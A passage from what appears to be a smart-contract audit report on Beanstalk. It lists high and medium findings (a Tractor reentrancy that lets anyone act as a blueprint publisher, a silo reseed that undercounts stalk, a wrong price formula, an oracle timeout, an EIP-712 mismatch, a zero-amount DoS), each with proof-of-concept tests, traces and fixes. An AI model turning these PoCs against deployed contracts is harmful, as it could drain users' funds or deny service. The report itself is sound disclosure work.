    │   │   │   │   ├─ [2847] BEAN/ETH Well::balanceOf(Beanstalk: [0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5]) [staticcall]
    │   │   │   │   │   ├─ [2598] well::balanceOf(Beanstalk: [0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [2847] BEAN/WSTETH Well::balanceOf(Beanstalk: [0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5]) [staticcall]
    │   │   │   │   │   ├─ [2598] well::balanceOf(Beanstalk: [0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [2714] Unripe Bean::balanceOf(Beanstalk: [0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [2714] Unripe LP::balanceOf(Beanstalk: [0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [2648] Weth::balanceOf(Beanstalk: [0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [2637] wstETH::balanceOf(Beanstalk: [0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] [0x0000000000000000000000000000000000000000000000000000000000000000]
    │   │   │   ├─ emit Tractor(operator: AttackerContract: [0x7f9F2c462d5F83B1a5CE6B80CbD691278Fa4647A], blueprintHash: 0xb32087471d4fbcd229ebc9de1783bd29bfe126e12d0914ad879f6824f9fb95fc)
    │   │   │   └─ ← [Return] [0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000]
    │   │   └─ ← [Return] [0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 703.03ms (6.43ms CPU time)

Ran 1 test suite in 1.52s (703.03ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

As we can see, when the `GetPublisher` event is emitted, the address matches with the Alice's one. That means that any function called inside the Beanstalk protocol will be done on behalf of Alice.

## Impact
High, if a publisher signs a hash to execute any of the previously mentioned functions, any user can execute any arbitrary function on his behalf. That includes transfering all tokens out of the publisher's balance, transfer fertilizer, transfer pods, etc...
There are just a few functions that allow this attack but if someone makes a blueprint executing any of these, can get all his positions drained by any malicious actor because it can be called by everyone.

## Tools Used
Manual review

## Recommendations
From my point of view the best mitigations would be:

1- Set s.sys.isFarm = 2. This way the refundEth function would not give the transaction execution to the caller.

2- Refund the Eth to the active publisher instead of the msg.sender by changing this:
```diff
    function refundEth() internal {
        AppStorage storage s = LibAppStorage.diamondStorage();
        if (address(this).balance > 0 && s.sys.isFarm != 2) {
-            (bool success, ) = msg.sender.call{value: address(this).balance}(new bytes(0));
+            (bool success, ) = LibTractor._user().call{value: address(this).balance}(new bytes(0));
            require(success, "Eth transfer Failed.");
        }
    }
```

3- Add the `nonReentrant` modifier in each of the previously mentioned functions
## <a id='H-21'></a>H-21. All migrated silo users will receive less stalk accounted to their account during silo reseed

_Submitted by [Draiakoo](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

All migrated silo users will have less stalk accounted to their account during silo reseed because the `s.sys.silo.assetSettings[siloDeposit.token].stalkIssuedPerBdv` will not be set

## Relevant GitHub Links:
https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/init/reseed/L2/ReseedSilo.sol#L112

## Vulnerability Details

When the Beanstalk will be migrated to an L2, the way to transfer the state from the L1 will be through the following order:

```Solidity
  reseeds = [
    reseed1,                        // remove all L1 diamond facets, pause beanstalk and transfer bean LPs to BCM
    reseedDeployL2Beanstalk,        // deploy a new beanstalk on L2
    reseed3,                        // reseed the field component
    reseed4,                        // reseed the barn component
    reseed5,                        // reseed the silo component
    reseed6,                        // reseed internal balances
    reseed7,                        // reseed whitelisted tokens
    reseed8,                        // reseed bean
    reseed9                         // add all facets to the diamond and unpause it
  ];
```

In this order, we can notice that the init from the reseed silo will be called before the reseed whitelisting of tokens.
Let's see what the reseed silo does:

```Solidity
    function reseedSiloDeposit(SiloDeposits calldata siloDeposit) internal {
        uint256 totalCalcDeposited;
        uint256 totalCalcDepositedBdv;
@>      uint256 stalkIssuedPerBdv = s.sys.silo.assetSettings[siloDeposit.token].stalkIssuedPerBdv;
        for (uint256 i; i < siloDeposit.siloDepositsAccount.length; i++) {
            AccountSiloDeposits memory deposits = siloDeposit.siloDepositsAccount[i];
            uint128 totalBdvForAccount;
            uint256 accountStalk;
            for (uint256 j; j < deposits.dd.length; j++) {
                // verify that depositId is valid.
                int96 stem = deposits.dd[j].stem;
                require(siloDeposit.stemTip >= stem, "ReseedSilo: INVALID_STEM");
                uint256 depositId = LibBytes.packAddressAndStem(siloDeposit.token, stem);

                // add deposit to account. Add to depositIdList.
                s.accts[deposits.accounts].deposits[depositId].amount = deposits.dd[j].amount;
                s.accts[deposits.accounts].deposits[depositId].bdv = deposits.dd[j].bdv;
                s.accts[deposits.accounts].depositIdList[siloDeposit.token].push(depositId);

                // increment totalBdvForAccount by bdv of deposit:
                totalBdvForAccount += deposits.dd[j].bdv;

                // increment by grown stalk of deposit.
                accountStalk += uint96(siloDeposit.stemTip - stem) * deposits.dd[j].bdv;

                // increment totalCalcDeposited and totalCalcDepositedBdv.
                totalCalcDeposited += deposits.dd[j].amount;
                totalCalcDepositedBdv += deposits.dd[j].bdv;

                // emit events.
                emit AddDeposit(
                    deposits.accounts,
                    siloDeposit.token,
                    stem,
                    deposits.dd[j].amount,
                    deposits.dd[j].bdv
                );
                emit TransferSingle(
                    deposits.accounts, // operator
                    address(0), // from
                    deposits.accounts, // to
                    depositId, // depositID
                    deposits.dd[j].amount // token amount
                );
            }
            // update mowStatuses for account and token.
            s.accts[deposits.accounts].mowStatuses[siloDeposit.token].bdv = totalBdvForAccount;
            s.accts[deposits.accounts].mowStatuses[siloDeposit.token].lastStem = siloDeposit
                .stemTip;

            // increment stalkForAccount by the stalk issued per BDV.
            // placed outside of loop for gas effiency.
@>          accountStalk += stalkIssuedPerBdv * totalBdvForAccount;

            // set stalk for account.
            s.accts[deposits.accounts].stalk = accountStalk;
        }

        // verify that the total deposited and total deposited bdv are correct.
        require(
            totalCalcDeposited == siloDeposit.totalDeposited,
            "ReseedSilo: INVALID_TOTAL_DEPOSITS"
        );
        require(
            totalCalcDepositedBdv == siloDeposit.totalDepositedBdv,
            "ReseedSilo: INVALID_TOTAL_DEPOSITED_BDV"
        );

        // set global state
        s.sys.silo.balances[siloDeposit.token].deposited = siloDeposit.totalDeposited;
        s.sys.silo.balances[siloDeposit.token].depositedBdv = siloDeposit.totalDepositedBdv;
    }
```

Basically, it accounts into the Beanstalk state all the token deposits that the user has in the L1 contract. However, we can see in the third line of the function that it fetches the `s.sys.silo.assetSettings[siloDeposit.token].stalkIssuedPerBdv` which is a state variable of the already deployed diamond on L2, but since this silo reseed will be called before the reseed for whitelisting tokens it will be 0 because it will not be initialized yet.
This problem will not cause any revert and will harm migrated users because at the end of each user loop we can see that the accounting of the user's stalk it adds the bdv of his position multiplied by this variable that should have a value but will be 0. So the user will have less stalk accounted to his position.

## Impact

High, all migrated users will get less stalk accounted to their position

## Tools Used

Manual review

## Recommendations

Pass the `stalkIssuedPerBdv` for each token in the calldata instead of fetching it from the state variable, that would make this init function to be independent of any other reseed:

```diff
    struct SiloDeposits {
        address token;
+       uint32 stalkIssuedPerBdv;
        AccountSiloDeposits[] siloDepositsAccount;
        int96 stemTip;
        uint128 totalDeposited;
        uint128 totalDepositedBdv;
    }

    function reseedSiloDeposit(SiloDeposits calldata siloDeposit) internal {
        uint256 totalCalcDeposited;
        uint256 totalCalcDepositedBdv;
-       uint256 stalkIssuedPerBdv = s.sys.silo.assetSettings[siloDeposit.token].stalkIssuedPerBdv;
+       uint256 stalkIssuedPerBdv = siloDeposit.stalkIssuedPerBdv;
        
        ...
    }
```

## <a id='H-22'></a>H-22. Incorrect calculation of `beanUsdPrice` in LibEvaluate::evalPrice 

_Submitted by [psb01](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Inside library LibEvaluate, In the function [evalPrice()](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/LibEvaluate.sol#L104-L120). `beanUsdPrice` is being calculated wrongly

> beanUsdPrice = 1e30 / ((usd/tkn)\*(bean/tkn)) 

## Vulnerability Details

```Solidity
function evalPrice(int256 deltaB, address well) internal view returns (uint256 caseId) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        // p > 1
        if (deltaB > 0) {
            // Beanstalk will only use the largest liquidity well to compute the Bean price,
            // and thus will skip the p > EXCESSIVE_PRICE_THRESHOLD check if the well oracle fails to
            // compute a valid price this Season.
            // deltaB > 0 implies that address(well) != address(0).
            uint256 beanTknPrice = LibWell.getBeanTokenPriceFromTwaReserves(well);
            if (beanTknPrice > 1) {
>              uint256 beanUsdPrice = uint256(1e30).div( 
>                  LibWell.getUsdTokenPriceForWell(well)  //  @ returns usd/tkn price
>                  .mul(beanTknPrice)                     //  @ returns bean/tkn price
               );
               if (beanUsdPrice > s.sys.seedGaugeSettings.excessivePriceThreshold) {
                  // p > excessivePriceThreshold
                  return caseId = 6;
              }
          }
          caseId = 3;
      }
      // p < 1
    }
```

Here `LibWell.getUsdTokenPriceForWell(well)` returns value in terms of usd/tkn price.

```Solidity
function getUsdTokenPriceForWell(address well) internal view returns (uint tokenUsd) {
>       tokenUsd = LibAppStorage.diamondStorage().sys.usdTokenPrice[well]; // @ returns usd/tkn price
    }
```

and `LibWell.getBeanTokenPriceFromTwaReserves(well)` return value in terms of bean/tkn price.

```Solidity
function getBeanTokenPriceFromTwaReserves(address well) internal view returns (uint256 price) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        // s.sys.twaReserve[well] should be set prior to this function being called.
        // 'price' is in terms of reserve0:reserve1.
        if (s.sys.twaReserves[well].reserve0 == 0 || s.sys.twaReserves[well].reserve1 == 0) {
            price = 0;
        } else {
            // fetch the bean index from the well in order to properly return the bean price.
            if (getBeanIndexFromWell(well) == 0) {
>               price = uint256(s.sys.twaReserves[well].reserve0).mul(1e18).div(  // @ returns bean/tkn price
                    s.sys.twaReserves[well].reserve1
                );
            } else {
                price = uint256(s.sys.twaReserves[well].reserve1).mul(1e18).div(
                    s.sys.twaReserves[well].reserve0
                );
            }
        }
    }
```

Combining above `beanUsdPrice` will be wrongly calculated in the form of  1e30 / ((usd/tkn)\*(bean/tkn)) .

## Impact

Wrong calculation of caseId which could result error in the evaluation of beanstalk causing wrong updation of temperature, BeanToMaxLPRatio, incorrect handling of rain and issuing wrong soil.

## Tools Used

Manual review

## Recommendations

```diff
-  uint256 beanUsdPrice = uint256(1e30).div(
-                    LibWell.getUsdTokenPriceForWell(well).mul(beanTknPrice)
-                );
+  uint256 beanUsdPrice = beanTknPrice.mul(1e18)
+                   .div(LibWell.getUsdTokenPriceForWell(well)
+                );
```


# Medium Risk Findings

## <a id='M-01'></a>M-01. USD prices dont work for 20 hours per day

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [Draiakoo](https://profiles.cyfrin.io/u/undefined), [KalyanSingh2](https://profiles.cyfrin.io/u/undefined). Selected submission by: [KalyanSingh2](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

LibUsdOracle will revert for stablecoins for 20 hours per day almost every day expect rare depeg events.

## Vulnerability Details

```solidity
    function getTokenPriceFromExternal(
        address token,
        uint256 lookback
    ) internal view returns (uint256 tokenPrice) {
        AppStorage storage s = LibAppStorage.diamondStorage();
			.....
            return
                uint256(1e24).div(
                    LibChainlinkOracle.getTokenPrice(
                        chainlinkOraclePriceAddress,
                        LibChainlinkOracle.FOUR_HOUR_TIMEOUT, 
                        ///@audit ^ incorrect timeout
                        lookback
                    )
                ); ///@audit reverts here as division by 0
        } else if (oracleImpl.encodeType == bytes1(0x02)) {
                    // assumes a dollar stablecoin is passed in
            // if the encodeType is type 2, use a uniswap oracle implementation.
			....
            // USDC/USD
            // call chainlink oracle from the OracleImplmentation contract
            Implementation memory chainlinkOracleImpl = s.sys.oracleImplementation[chainlinkToken];
            address chainlinkOraclePriceAddress = chainlinkOracleImpl.target;
			.....
            uint256 chainlinkTokenPrice = LibChainlinkOracle.getTokenPrice(
                chainlinkOraclePriceAddress,
                LibChainlinkOracle.FOUR_HOUR_TIMEOUT, ///@audit < same
                lookback
            );
            return tokenPrice.mul(chainlinkTokenPrice).div(1e6);
        }
```

Chainlink stables have a heart beat of 24 hours i.e if the deviation threshold is not passed for this much time there will be no update to the [price](https://github.com/smartcontractkit/documentation/blob/01fce67a7116c296af666feabe55883812936bb9/src/content/data-feeds/index.mdx?plain=1#L129-L139) , but getTokenPriceFromExternal() hardcodes this limit to 4 hours which leads to price of token = 0 if the token is a stablecoin

Here's a POC -

```solidity
/**
 * SPDX-License-Identifier: MIT
 **/

pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import {C} from "contracts/C.sol";
import {LibEthUsdOracle} from "../../../contracts/libraries/Oracle/LibEthUsdOracle.sol";
import {LibUniswapOracle} from "../../../contracts/libraries/Oracle/LibUniswapOracle.sol";
import {LibChainlinkOracle} from "../../../contracts/libraries/Oracle/LibChainlinkOracle.sol";
import {LibWstethUsdOracle} from "../../../contracts/libraries/Oracle/LibWstethUsdOracle.sol";
import "../../../contracts/libraries/Oracle/LibWstethEthOracle.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {LibAppStorage} from "contracts/libraries/LibAppStorage.sol";
import {Implementation} from "contracts/beanstalk/storage/System.sol";
import {AppStorage} from "contracts/beanstalk/storage/AppStorage.sol";
import {LibRedundantMath256} from "contracts/libraries/LibRedundantMath256.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {console} from "forge-std/console.sol";
import {LibUsdOracle} from "../../../contracts/libraries/Oracle/LibUsdOracle.sol";

interface IERC20Decimals {
    function decimals() external view returns (uint8);
}

interface ChainlinkPriceFeedRegistry {
    function getFeed(address base, address quote) external view returns (address aggregator);
}


contract Diamond{
    AppStorage internal s;
}

contract PriceTesterWstethETH is Diamond,Test{
    

    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant DAIUSDC = 0x6c6Bc977E13Df9b0de53b251522280BB72383700;
    address public constant USDCUSD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address public constant AAVEUSD = 0x547a514d5e3769680Ce22B2361c10Ea13619e8a9;
    address public constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    using LibRedundantMath256 for uint256;
    function setUp() public {
        vm.label(DAI,"DAI");
        vm.label(USDC,"USDC");
        vm.label(DAIUSDC,"UniV3DaiUsdc");
        vm.label(USDCUSD,"USDCFeed");
        vm.label(AAVEUSD,"AAVEUSD");
        vm.createSelectFork("https://rpc.ankr.com/eth",20008200);
        // vm.createSelectFork("https://rpc.ankr.com/eth",20253304 +5);
        // for the above fork the execution does not revert
    }   



    function testPrice2() public {
        bytes4 b;
        Implementation memory a2 = Implementation({
            target: USDCUSD,
            selector: b,
            encodeType:bytes1(0x01)
        });
        s.sys.oracleImplementation[USDC] = a2;
        uint price2;
        // Execution reverts due to LibChainlinkOracle returning 0 & 1e24/0 happening
        price2 = LibUsdOracle.getUsdPrice(USDC);
        emit log_named_decimal_uint("price2", price2, 6);
    }

}
```

The claims can also be verified by looking at\
<https://data.chain.link/feeds/base/base/usdt-usd>\
&\
<https://data.chain.link/feeds/ethereum/mainnet/usdc-usd>

where libUsdOracle is setting maxTimeout = 4 hours but the chainlink feeds only get updated once per day in most of the cases(strictly stablecoins) .\
You can also verify the same by uncommenting the 2nd fork line USDC/USD was updated in 20253304 block number so then it will work but in blocks after that i.e for rest of 20 hours for the day it wont.\
As it wont pass legitimacy checks in [LibChainlinkOracle.sol](https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/4e0ad0b964f74a1b4880114f4dd5b339bc69cd3e/protocol/contracts/libraries/Oracle/LibChainlinkOracle.sol#L182-L196)\
Run the Poc by putting it in test/foundry/OracleLibs(newDir)/Filename.t.sol for working imports

**Please note that the POC reverts in the first fork due to division of 1e24/ tokenPrice( which is 0 due to timeout)**

**Code snippets**-\
<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/4e0ad0b964f74a1b4880114f4dd5b339bc69cd3e/protocol/contracts/libraries/Oracle/LibUsdOracle.sol#L100-L161>

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/4e0ad0b964f74a1b4880114f4dd5b339bc69cd3e/protocol/contracts/libraries/Oracle/LibChainlinkOracle.sol#L182-L196>

## Impact

Non functioning price feeds , breaks core functionality

## Tools Used

Manual Review

## Recommendations

For stables set threshold(maxTmeout) of 24 hours.

## <a id='M-02'></a>M-02. The declaration and use of `LibTractor::BLUEPRINT_TYPE_HASH` are inconsistent with the structure `struct Blueprint`, and the standard is confusing. It is recommended to unify the standard

_Submitted by [joicygiore](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [T1MOH](https://profiles.cyfrin.io/u/undefined), [inh3l](https://profiles.cyfrin.io/u/undefined), [Draiakoo](https://profiles.cyfrin.io/u/undefined), [0xShoonya](https://profiles.cyfrin.io/u/undefined). Selected submission by: [joicygiore](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/libraries/LibTractor.sol#L22-L49

## Summary
The declaration and use of `LibTractor::BLUEPRINT_TYPE_HASH` is inconsistent with the field name of the structure `struct Blueprint`. This inconsistency may cause signature verification to fail.
## Vulnerability Details
```js
    bytes32 private constant TRACTOR_HASHED_NAME = keccak256(bytes("Tractor"));
    bytes32 private constant TRACTOR_HASHED_VERSION = keccak256(bytes("1"));
    bytes32 private constant EIP712_TYPE_HASH =
        keccak256(
            "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
        );
    bytes32 public constant BLUEPRINT_TYPE_HASH =
        keccak256(
@>            "Blueprint(address publisher,bytes data,bytes operatorData,uint256 maxNonce,uint256 startTime,uint256 endTime)"
        );


    struct TractorStorage {
        // Number of times the blueprint has been run.
        mapping(bytes32 => uint256) blueprintNonce;
        // Publisher Address => counter id => counter value.
        mapping(address => mapping(bytes32 => uint256)) blueprintCounters;
        // Publisher of current operations. Set to address(1) when no active publisher.
        address payable activePublisher;
    }


    // Blueprint stores blueprint related values
    struct Blueprint {
        address publisher;
        bytes data;
@>        bytes32[] operatorPasteInstrs;
        uint256 maxNonce;
        uint256 startTime;
        uint256 endTime;
    }
```
And `MessageHashUtils.toEthSignedMessageHash()` in `TractorFacet::verifyRequisition()` adds a fixed prefix, which should be EIP-191, which is different from the EIP-712 standard.
```js
    modifier verifyRequisition(LibTractor.Requisition calldata requisition) {
        bytes32 blueprintHash = LibTractor._getBlueprintHash(requisition.blueprint);
        require(blueprintHash == requisition.blueprintHash, "TractorFacet: invalid hash");
        address signer = ECDSA.recover(
@>            MessageHashUtils.toEthSignedMessageHash(requisition.blueprintHash),
            requisition.signature
        );
        require(signer == requisition.blueprint.publisher, "TractorFacet: signer mismatch");
        _;
    }
```
The test was performed correctly because the standard Ethereum message signing method (EIP-191) was used in the test, but problems would occur if it was replaced with EIP-712 (see the Poc below).
```js
// EIP-191
signature = await signer.signMessage(
    ethers.utils.arrayify(blueprintHash)
);
// EIP-712 
signature = await signer._signTypedData(domain, types, blueprint);
```
### Poc
```js
// EIP712Test.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/cryptography/EIP712.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract EIP712Test is EIP712 {
    string private constant SIGNING_DOMAIN = "EIP712Test";
    string private constant SIGNATURE_VERSION = "1";

    // Blueprint struct definition
    struct Blueprint {
        address publisher;
        bytes data;
        bytes32[] operatorPasteInstrs;
        uint256 maxNonce;
        uint256 startTime;
        uint256 endTime;
    }

    // Correct type hash definition
    bytes32 public constant BLUEPRINT_TYPE_HASH_CORRECT =
        keccak256(
            "Blueprint(address publisher,bytes data,bytes32[] operatorPasteInstrs,uint256 maxNonce,uint256 startTime,uint256 endTime)"
        );

    // Incorrect type hash definition
    bytes32 public constant BLUEPRINT_TYPE_HASH_INCORRECT =
        keccak256(
            "Blueprint(address publisher,bytes data,bytes operatorData,uint256 maxNonce,uint256 startTime,uint256 endTime)"
        );

    constructor() EIP712(SIGNING_DOMAIN, SIGNATURE_VERSION) {}

    // Function to hash the Blueprint struct with the correct type hash
    function getBlueprintHashCorrect(Blueprint calldata blueprint) public view returns (bytes32) {
        return
            _hashTypedDataV4(
                keccak256(
                    abi.encode(
                        BLUEPRINT_TYPE_HASH_CORRECT,
                        blueprint.publisher,
                        keccak256(blueprint.data),
                        keccak256(abi.encodePacked(blueprint.operatorPasteInstrs)),
                        blueprint.maxNonce,
                        blueprint.startTime,
                        blueprint.endTime
                    )
                )
            );
    }

    // Function to hash the Blueprint struct with the incorrect type hash
    function getBlueprintHashIncorrect(Blueprint calldata blueprint) public view returns (bytes32) {
        return
            _hashTypedDataV4(
                keccak256(
                    abi.encode(
                        BLUEPRINT_TYPE_HASH_INCORRECT,
                        blueprint.publisher,
                        keccak256(blueprint.data),
                        keccak256(abi.encodePacked(blueprint.operatorPasteInstrs)),
                        blueprint.maxNonce,
                        blueprint.startTime,
                        blueprint.endTime
                    )
                )
            );
    }

    // Function to verify the signature with the correct type hash
    function verifySignatureCorrect(
        Blueprint calldata blueprint,
        bytes calldata signature
    ) public view returns (address) {
        bytes32 digest = getBlueprintHashCorrect(blueprint);
        return ECDSA.recover(digest, signature);
    }

    // Function to verify the signature with the incorrect type hash
    function verifySignatureIncorrect(
        Blueprint calldata blueprint,
        bytes calldata signature
    ) public view returns (address) {
        bytes32 digest = getBlueprintHashIncorrect(blueprint);
        return ECDSA.recover(digest, signature);
    }
}
```

```js
// eip.test.js
const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("EIP712Test", function () {
  let EIP712Test;
  let eip712Test;
  let signer;
  let publisher;
  let blueprint;
  let signature;

  beforeEach(async function () {
    [signer, publisher] = await ethers.getSigners();
    EIP712Test = await ethers.getContractFactory("EIP712Test");
    eip712Test = await EIP712Test.deploy();
    await eip712Test.deployed();

    blueprint = {
      publisher: publisher.address,
      data: ethers.utils.hexlify(ethers.utils.toUtf8Bytes("test data")),
      operatorPasteInstrs: [ethers.utils.formatBytes32String("instr1")],
      maxNonce: 1,
      startTime: Math.floor(Date.now() / 1000),
      endTime: Math.floor(Date.now() / 1000) + 3600
    };

    const domain = {
      name: "EIP712Test",
      version: "1",
      chainId: (await ethers.provider.getNetwork()).chainId,
      verifyingContract: eip712Test.address
    };

    const types = {
      Blueprint: [
        { name: "publisher", type: "address" },
        { name: "data", type: "bytes" },
        { name: "operatorPasteInstrs", type: "bytes32[]" },
        { name: "maxNonce", type: "uint256" },
        { name: "startTime", type: "uint256" },
        { name: "endTime", type: "uint256" }
      ]
    };

    signature = await signer._signTypedData(domain, types, blueprint);
    console.log("signer address:", signer.address);
  });

  it("should verify signature with correct type hash", async function () {
    const recoveredAddress = await eip712Test.verifySignatureCorrect(blueprint, signature);
    expect(recoveredAddress).to.equal(signer.address);
    console.log("BLUEPRINT_TYPE_HASH_CORRECT:", recoveredAddress);
  });

  it("should not verify signature with incorrect type hash", async function () {
    const recoveredAddress = await eip712Test.verifySignatureIncorrect(blueprint, signature);
    expect(recoveredAddress).to.not.equal(signer.address);
    console.log("BLUEPRINT_TYPE_HASH_INCORRECT:", recoveredAddress);
  });
});


```
run test
```zsh
  EIP712Test
signer address: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
BLUEPRINT_TYPE_HASH_CORRECT: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
    ✔ should verify signature with correct type hash (429ms)
signer address: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
BLUEPRINT_TYPE_HASH_INCORRECT: 0x78b9981c5e24E92ED1c6dC386541bFB9a2C4048A
    ✔ should not verify signature with incorrect type hash
```
### Code Snippet
https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/libraries/LibTractor.sol#L22-L49
https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/8c8710df547f7d7c5dd82c5381eb6b34532e4484/protocol/contracts/beanstalk/farm/TractorFacet.sol#L32-L41
## Impact
The declaration and use of `LibTractor::BLUEPRINT_TYPE_HASH` is inconsistent with the field name of the structure `struct Blueprint`. This inconsistency may cause signature verification to fail. In addition, the standards are confusing. It is recommended to unify the standards.

## Tools Used
Manual Review
## Recommendations
Unified Signature Standard and modify `BLUEPRINT_TYPE_HASH`
```diff
    bytes32 public constant BLUEPRINT_TYPE_HASH =
        keccak256(
-            "Blueprint(address publisher,bytes data,bytes operatorData,uint256 maxNonce,uint256 startTime,uint256 endTime)"
+            "Blueprint(address publisher,bytes data,bytes32[] operatorPasteInstrs,uint256 maxNonce,uint256 startTime,uint256 endTime)"
        );
```
## <a id='M-03'></a>M-03. `SiloFacet::transferDeposit` does not verify if amount is 0, leading to full withdrawal DoS for any recipient

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/undefined), [n0kto](https://profiles.cyfrin.io/u/undefined). Selected submission by: [n0kto](https://profiles.cyfrin.io/u/undefined)._      
            


## Description

The `SiloFacet::transferDeposit` function allows any user to transfer their deposit to another user. However, the function does not check the amount being transfered. Worse still, if this amount is 0, it repeatedly pushes the same `depositId` into `s.accts[account].depositIdList[token]`:

```Solidity
    function addDepositToAccount(
        ...
    ) internal {
        AppStorage storage s = LibAppStorage.diamondStorage();
        uint256 depositId = LibBytes.packAddressAndStem(token, stem);

        // add a depositId to an account's depositList, if there is not an existing deposit.
@>        if (s.accts[account].deposits[depositId].amount == 0) {
@>            s.accts[account].depositIdList[token].push(depositId);
        }
        ...
    }
```

A user can call `SiloFacet::transferDeposit` with an amount of 0 and any recipient multiple times to inflate the recipient's array length, causing a DoS for all functions that use `s.accts[account].depositIdList[token]` in memory (due to excessive gas costs for memory) or in a loop (due to excessive gas costs for executing instructions).

The real issue is that this variable is used in critical parts of the code (tree representing where functions are called):

```Solidity
- SiloGettersFacet::getTokenDepositIdsForAccount            - Full DoS
- SiloGettersFacet::getTokenDepositsForAccount              - Full DoS
    - SiloGettersFacet::getDepositsForAccount               - Full DoS

- LibTokenSilo::findDepositIdForAccount                     - Full DoS
    - LibTokenSilo::removeDepositIDfromAccountList          - Full DoS
        - LibTokenSilo::removeDepositFromAccount            - DoS if all assets of a token is removed/withdraw/transfer
            - LibConvert::_withdrawTokens                   - DoS if all assets of a token is removed/withdraw/transfer
                - PipelineConvertFacet::pipelineConvert     - DoS if all assets of a token is removed/withdraw/transfer
                - ConvertFacet::convert                     - DoS if all assets of a token is removed/withdraw/transfer
            - LibSilo::_removeDepositFromAccount            - DoS if all assets of a token is removed/withdraw/transfer
                - TokenSilo::_withdrawDeposit               - DoS if all assets of a token is removed/withdraw/transfer
                    - SiloFacet::withdrawDeposit            - DoS if all assets of a token is removed/withdraw/transfer
                - TokenSilo::_transferDeposit               - DoS if all assets of a token is removed/withdraw/transfer
                    - SiloFacet::transferDeposit            - DoS if all assets of a token is removed/withdraw/transfer
                - TokenSilo::_transferDeposits              - DoS if all assets of a token is removed/withdraw/transfer
                    - SiloFacet::transferDeposits           - DoS if all assets of a token is removed/withdraw/transfer
            - LibSilo::_removeDepositsFromAccount           - DoS if all assets of a token is removed/withdraw/transfer
                - TokenSilo::_withdrawDeposits              - DoS if all assets of a token is removed/withdraw/transfer
                    - SiloFacet::withdrawDeposits           - DoS if all assets of a token is removed/withdraw/transfer

            - EnrootFacet::enrootDeposit                    - DoS if all assets of a token is removed/withdraw/transfer
```

This bug only causes a full withdrawal/transfer/removal DoS because `LibTokenSilo::removeDepositIDfromAccountList` is called in `LibTokenSilo::removeDepositFromAccount` with this condition:

```Solidity
// Full remove
if (crateAmount > 0) {
  delete s.accts[account].deposits[depositId];
  removeDepositIDfromAccountList(account, token, depositId);
}
```

## Risk

**Likelyhood**: High

* Before the migration, executing this attack will be costly, but once the migration is completed, it can be executed on anyone at a very low cost.

**Impact**: Medium

* Key functions will revert if a user attempts to move/withdraw the whole amount of a token.
* Impossible to withdraw/transfer all the funds of a token: dust will be stuck in the contract.

## Recommended Mitigation

Before pushing any new ID into the `depositIdList` array, check if the amount is 0.

```diff
    function addDepositToAccount(
        ...
    ) internal {
        AppStorage storage s = LibAppStorage.diamondStorage();
